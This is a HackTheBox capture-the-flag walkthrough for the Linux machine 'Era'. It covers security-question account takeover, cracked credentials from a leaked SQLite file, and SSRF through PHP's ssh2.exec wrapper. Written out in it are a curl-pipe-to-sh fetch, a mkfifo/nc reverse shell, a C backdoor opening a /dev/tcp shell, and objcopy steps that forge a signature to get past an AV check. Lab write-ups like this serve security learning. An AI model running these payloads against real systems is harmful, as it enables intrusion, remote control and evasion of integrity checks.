---
title: "Era"
date: 2025-07-26
retire_date: 9999-09-09
tags: ["htb", "Linux", "Medium"]
difficulty: "Medium"
base_points: 30
event: "HackTheBox"
Author: ""
cover:
  image: "/images/ctf/htb/machines.jpg"
  alt: "Era Machine"
  relative: true
---

{{< machine-info-shortcode >}}

## Walkthrough

Medium - Linux

A web-app account-takeover via security-question reset, creds from a leaked SQLite DB, an SSRF through PHP's `ssh2.exec` wrapper for the foothold, and a signed-binary AV bypass for root.

## Enum

Two ports are open — FTP and HTTP. Browsing the site reveals a new subdomain, `file.era.htb`.

The app lets us register, and crucially lets us change the security questions of *any* user as long as we know a valid username — so once we have a username we can reset its questions and log in as that account.

### SQLite

Brute-forcing the file `id` parameter shows which files we're allowed to download:

{{< figure src="/images/ctf/htb/Pasted image 20250726153224.png" alt="file id brute force" caption=" " align="center" >}}

{{< figure src="/images/ctf/htb/Pasted image 20250726153246.png" alt="downloadable files" caption=" " align="center" >}}

One of them is `filedb.sqlite`, which holds credentials:

{{< figure src="/images/ctf/htb/Pasted image 20250726153321.png" alt="creds in sqlite" caption=" " align="center" >}}

A couple of the hashes crack:

```
eric : america
yuri : mustang
```

### FTP

`yuri`'s creds work on FTP, letting us pull down all the available source files to understand the download logic.

## user.txt

The `download.php` endpoint is vulnerable to SSRF via the `format` parameter — it passes our value into a PHP stream wrapper, so we abuse `ssh2.exec://` to run a command on the box as `yuri`.

First, a reverse-shell payload we'll fetch and pipe to `sh`:

`mbi.sh`
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.56 4444 >/tmp/f
```

Host it on a simple Kali web server, then trigger the SSRF — we need to be the `admin_ef01cab31aa` user on the site and request the crafted URL:

```
http://file.era.htb/download.php?id=6627&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/curl+-s+http://10.10.14.56/mbi.sh|sh;
```
The `ssh2.exec://` wrapper SSHes to `127.0.0.1` as `yuri` and executes our `curl … | sh`, giving a shell back.

From the shell we reuse the cracked passwords and `su` to `eric` to read `user.txt`.

## root.txt

In `/opt` there's a `monitor` binary run by a periodic "AV" check — it only executes binaries carrying a valid signature section, so we forge a signed backdoor.

A tiny C backdoor that pops a root reverse shell:

`backdoor.c`
```
printf '#include <stdlib.h>\nint main() {\n    system("/bin/bash -c '\''bash -i >& /dev/tcp/10.10.14.56/4444 0>&1'\''");\n    return 0;\n}\n' > backdoor.c
```

Compile it statically, then copy the legitimate binary's signature section onto ours so it passes the check:

```
gcc -static -o monitor_backdoor backdoor.c
objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor
objcopy --add-section .text_sig=sig monitor_backdoor
```
`objcopy --dump-section` extracts the trusted `.text_sig` signature from the real `monitor`, and `--add-section` grafts it onto our backdoor so the AV treats it as signed.

Start a listener, then drop the backdoor in place of the monitored binary — the periodic check runs it as root:

```
cp monitor_backdoor /opt/AV/periodic-checks/monitor
```

{{<seperator>}}
